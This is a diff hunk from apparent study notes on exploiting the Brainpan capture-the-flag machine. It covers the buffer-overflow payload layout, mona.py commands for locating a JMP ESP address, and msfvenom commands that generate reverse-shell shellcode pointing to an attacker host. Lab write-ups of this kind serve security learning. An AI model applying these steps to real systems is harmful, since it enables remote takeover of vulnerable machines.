@@ -94,7 +94,7 @@ MAC Address: 08:00:27:E5:0B:E5 (Oracle VirtualBox virtual NIC)
     buffer = "A"*offset + (the address of ESP) + PAD + shellcode
     //for ESP, we need to map the opcode(operation code) of JMP ESP, that is \xff\xe4.
         //!mona modules (mona.py) -- to check the sofatware is protected or not,  if it is false, we can find the addr os EIP, by find \xff\xe4
-        //!mona find -s "\xff\xe4" -m brainpan.exe, we get a addr 311712f3, but the addr in the ram is "\xf3\x12\x17\x31"
+        //!mona find -s "\xff\xe4" -m brainpan.exe, we get a addr 311712f3, but the addr in the ram is "\xf3\x12\x17\x31"  //!mona jmp -r esp -cpb "\x00"
     //  reverse shellcode of bytes format,
         //msfvenom -p windows/shell_reverse_tcp LHOST=xx LPORT=xx EXITFUNC=thread -f c -a x86 -b "\x00" (use to test on win host)
         //msfvenom -p linux/x86/shell_reverse_tcp LHOST=xx LPORT=xx EXITFUNC=thread -f c -a x86 -b "\x00" (use on kali)
